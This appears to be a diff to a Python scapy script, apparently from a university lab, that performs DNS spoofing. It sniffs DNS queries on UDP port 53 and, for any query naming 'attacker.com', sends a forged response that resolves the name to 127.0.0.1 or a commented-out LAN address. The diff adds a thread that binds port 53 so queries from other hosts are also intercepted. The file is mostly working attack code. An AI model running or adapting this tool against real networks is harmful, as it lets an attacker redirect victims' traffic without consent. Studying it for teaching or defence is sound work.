@@ -1,11 +1,12 @@
+#! /usr/bin/env python
 '''
 Created on Dec 9, 2011
 
-@author: Tobias Endres
+@author: Tobias Endres, Frieder Paape
 '''
-#! /usr/bin/env python
 
-from scapy.all import sniff, send, Ether, IP, UDP, DNS, DNSRR, UDPerror
+import threading, socket
+from scapy.all import sniff, send, IP, UDP, DNS, DNSRR, UDPerror
 
 attacker = "attacker.com"
 
@@ -16,14 +17,47 @@ def dns_callback(pkt):
         dns=pkt.getlayer(DNS)
         
         if dns.qr:
-            return #dns.summary()
+            return dns.summary()
         else:
-            if attacker in dns.qd.qname:
+            if dns.qd != None and attacker in dns.qd.qname:
                 
-                answer = IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qr=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata="127.0.0.1"))#"192.168.1.160"))
-                send(answer)
+                answer = IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qr=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata="127.0.0.1"))#"192.168.1.199"))#
+                send(answer,loop=0)
                 return dns.summary()
 
-sniff( filter="udp port 53", prn = dns_callback,  store=0)
+class ListenThread ( threading.Thread ):
+    
+    __stopped = False
+        
+    def stop(self):
+        self.__stopped=True
+
+    def run ( self ):
+    
+        # auf port 53 hoeren, sodass wir via sniff auch anfragen von auserhalb mitbekommen
+        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udps.bind(('',53))
+        udps.settimeout(1)
+        
+        while self.__stopped==False:
+            try:
+                udps.recv(1024)
+            except socket.error:
+                continue
+
+        udps.close()
+
+if __name__ == '__main__':
+    lt = ListenThread()
+    lt.deamon = True
+    lt.start()
+    
+    sniff( filter="udp port 53", prn = dns_callback,  store=0)
+        
+    lt.stop()
+
+
+
+
 
 
